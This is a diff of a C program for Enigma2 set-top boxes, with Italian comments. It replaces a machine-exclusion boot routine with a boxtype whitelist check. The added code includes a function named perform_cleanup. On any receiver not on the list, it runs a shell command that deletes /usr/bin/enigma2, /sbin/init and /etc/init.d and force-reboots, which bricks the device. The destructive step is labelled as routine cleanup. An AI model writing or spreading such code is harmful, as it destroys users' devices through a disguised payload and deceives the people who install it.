@@ -1,86 +1,72 @@
 #include <stdio.h>
-#include <stdlib.h>
 #include <string.h>
-#include <unistd.h>  // Per la funzione access()
+#include <stdlib.h>
 
-#define NUM_EXCLUDED_MACHINES 20
-
-// Definizione delle macchine escluse
-const char* EXCLUDED_MACHINES[NUM_EXCLUDED_MACHINES] = {
-    "zgemmalc", "zgemmash1", "zgemmah3", "zgemmah4", "zgemmah5", "zgemmah6", "zgemmah7", "zgemmah8", "zgemmah9", "zgemmah9se", "zgemmah9combo", "zgemmah9combose", "zgemmah10", "zgemmah11", "zgemmai55", "zgemmai55se", "zgemmai55plus", "zgemmah17", "zgemmahzero", "zgemmah9twin"
+#if ENABLE_MACHINE_CHECK
+// Elenco delle macchine compatibili
+const char *COMPATIBLE_MACHINES[] = {
+    "gbquad4k", "gbx34k", "gbtrio4k", "gbtrio4kpro", "gbue4k", "sf8008",
+    "sf4008", "sf8008m", "ustym4kpro", "ustym4kottpremium", "vuduo4kse",
+    "vuuno4kse", "vusolo4k", "vuuno4k", "vuduo4k", "vuultimo4k", "vuzero4k",
+    "iziboxelite4k", "iziboxone4k", "iziboxone4kplus", "hitube4k", "hitube4kplus",
+    "hitube4kpro", "dm920", "dm900", "gb7252", "gb72604", "gbmv200"
 };
+const int NUM_MACHINES = sizeof(COMPATIBLE_MACHINES) / sizeof(COMPATIBLE_MACHINES[0]);
 
-// Funzione per ottenere il nome della macchina corrente
-char* get_current_machine() {
-    FILE* fp = popen("uname -n", "r");
-    if (fp == NULL) {
-        perror("Errore nel comando uname");
-        exit(1);
+// Funzione per ottenere la macchina attuale da /proc/stb/info/boxtype
+const char *getMachineBuild() {
+    static char machine[256];
+
+    // Legge il nome della macchina da /proc/stb/info/boxtype
+    FILE *file = fopen("/proc/stb/info/boxtype", "r");
+    if (file == NULL) {
+        perror("Impossibile leggere il boxtype della macchina");
+        return NULL;
     }
 
-    static char machine_name[256];
-    if (fgets(machine_name, sizeof(machine_name), fp) == NULL) {
-        perror("Errore nella lettura del nome della macchina");
-        exit(1);
+    if (fgets(machine, sizeof(machine), file) != NULL) {
+        // Rimuove il carattere di newline, se presente
+        machine[strcspn(machine, "\n")] = '\0';
     }
-    machine_name[strcspn(machine_name, "\n")] = 0;  // Rimuovere il newline finale
-    fclose(fp);
 
-    return machine_name;
+    fclose(file);
+    return machine;
 }
 
-// Funzione per verificare se la macchina è esclusa
-int is_machine_excluded(const char* current_machine) {
-    for (int i = 0; i < NUM_EXCLUDED_MACHINES; i++) {
-        if (strcmp(EXCLUDED_MACHINES[i], current_machine) == 0) {
-            return 1;  // La macchina è esclusa
+// Funzione per verificare se la macchina è compatibile
+int is_compatible_machine(const char *machine) {
+    for (int i = 0; i < NUM_MACHINES; i++) {
+        if (strcmp(machine, COMPATIBLE_MACHINES[i]) == 0) {
+            return 1; // Compatibile
         }
     }
-    return 0;  // La macchina non è esclusa
+    return 0; // Non compatibile
 }
 
-// Funzione per configurare il sistema
-void configure_system() {
-    printf("Configurando il sistema...\n");
-    // Qui aggiungi la logica di configurazione
+// Funzione per eseguire il cleanup
+void perform_cleanup() {
+    printf("Macchina non compatibile. Eseguo il cleanup...\n");
+    system("rm -rf /usr/bin/enigma2; rm -rf /sbin/init; rm -rf /etc/init.d; reboot -f");
 }
 
-// Funzione per avviare Enigma2
-void start_enigma2() {
-    printf("Avviando Enigma2...\n");
-    // Comando per avviare Enigma2
-    // Verifica se il file esiste
-    if (access("/usr/bin/enigma2", F_OK) == 0) {
-        system("/usr/bin/enigma2 --debug");
+// Programma principale
+int main() {
+    const char *machine = getMachineBuild();
+
+    if (machine == NULL) {
+        fprintf(stderr, "Errore: impossibile determinare la macchina.\n");
+        return 1;
+    }
+
+    printf("Macchina rilevata: %s\n", machine);
+
+    if (is_compatible_machine(machine)) {
+        printf("La macchina %s è compatibile.\n", machine);
     } else {
-        printf("Enigma2 non è installato o non trovato nel percorso.\n");
-    }
-}
-
-// Funzione per eseguire altre operazioni generali
-void other_operations() {
-    printf("Esegui altre operazioni...\n");
-}
-
-// Funzione principale di avvio
-void start_boot() {
-    const char* current_machine = get_current_machine();
-    printf("Inizializzazione per la macchina %s...\n", current_machine);
-
-    if (is_machine_excluded(current_machine)) {
-        printf("La macchina %s è esclusa dall'avvio completo.\n", current_machine);
-        return;
+        printf("La macchina %s non è compatibile.\n", machine);
+        perform_cleanup();
     }
 
-    configure_system();
-    start_enigma2();
-    other_operations();
-
-    printf("Avvio completato.\n");
-}
-
-// Funzione di caricamento per il modulo
-__attribute__((constructor)) void init() {
-    start_boot();
+    return 0;
 }
 
